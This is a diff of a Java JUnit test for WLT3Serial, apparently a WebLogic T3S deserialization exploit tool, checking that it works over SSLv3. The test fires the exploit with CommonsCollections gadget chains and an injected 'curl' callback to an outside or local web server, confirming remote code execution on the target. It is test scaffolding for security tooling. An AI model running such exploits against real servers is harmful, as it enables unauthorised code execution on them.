@@ -1,43 +1,59 @@
 /*
 	SSLv3Test.java
 	
-	v0.3 ()
+	v0.3 (1/18/2018)
 
 	Test to ensure WLT3Serial communicates via T3S with SSLv3
 */
 
 package bort.millipede.wlt3.tests.ssltls;
 
-import bort.millipede.wlt3.WLT3Serial;
+import java.io.IOException;
 import java.net.Socket;
 import javax.net.ssl.SSLSocket;
 import javax.net.ssl.SSLSocketFactory;
+
+import bort.millipede.wlt3.tests.WLT3SerialTestHelper;
+import bort.millipede.wlt3.tests.WebServerTestHelper;
 import org.junit.Assert;
 import org.junit.Test;
+import org.junit.Before;
+import org.junit.After;
 
 public class SSLv3Test {
+	WebServerTestHelper ws;
+	
+	@Before
+	public void setUp() throws IOException {
+		try {
+			ws = new WebServerTestHelper();
+		} catch(IOException ioe) {
+			throw new IOException("Embedded web server component failed to start!",ioe);
+		} catch(Exception e) {
+			throw e;
+		}
+	}
+	
+	@After
+	public void tearDown() {
+		try {
+			ws.stop();
+		} catch(Exception e) {
+			//don't care
+		}
+	}
 	
 	@Test
 	public void testAssertUsingSSLv3() {
-		//set connection properties
+		//check input properties and run exploit
+		WLT3SerialTestHelper.checkTargetParams();
 		String host = System.getProperty("wlt3.target.host");
-		String strPort = System.getProperty("wlt3.target.port");
-		Assert.assertNotNull("System property \"wlt3.target.host\" not set!",host);
-		Assert.assertNotNull("System property \"wlt3.target.port\" not set!",strPort);
-		int port = -1;
-		try {
-			port = Integer.parseInt(strPort);
-			if((port<0) && (port>65535)) {
-				throw new AssertionError("Provided port "+strPort+" is not a valid TCP port! Valid TCP ports: 0-65535");
-			}
-		} catch (Exception e) {
-			throw new AssertionError("Provided port "+strPort+" is not a valid TCP port!");
-		}
-		
-		//attempt to run actual exploit
-		WLT3Serial.main(new String[] {"--t3s=SSLv3",host,strPort,"CommonsCollections5","curl http://192.168.1.12/"+this.getClass().getName()+"testAssertUsingSSLv3"});
+		String strPort = System.getProperty("wlt3.target.t3s.port");
+		String path = ws.createContext();
+		WLT3SerialTestHelper.runExploit("--t3s=SSLv3","CommonsCollections6","curl http://"+System.getProperty("localhost.ip")+":"+Integer.toString(ws.getPort())+"/"+path);
 		
 		//create socket for retrieving SSLSocketFactory
+		int port = Integer.parseInt(strPort);
 		Socket sock = null;
 		try {
 			sock = new Socket(host,port);
@@ -65,7 +81,6 @@ public class SSLv3Test {
 		} catch (Exception e) {
 			//don't care
 		}
-		System.out.println(this.getClass().getName()+"->testAssertUsingSSLv3: WLT3Serial executed successfully using T3S with SSLv3");
 	}
 }
 
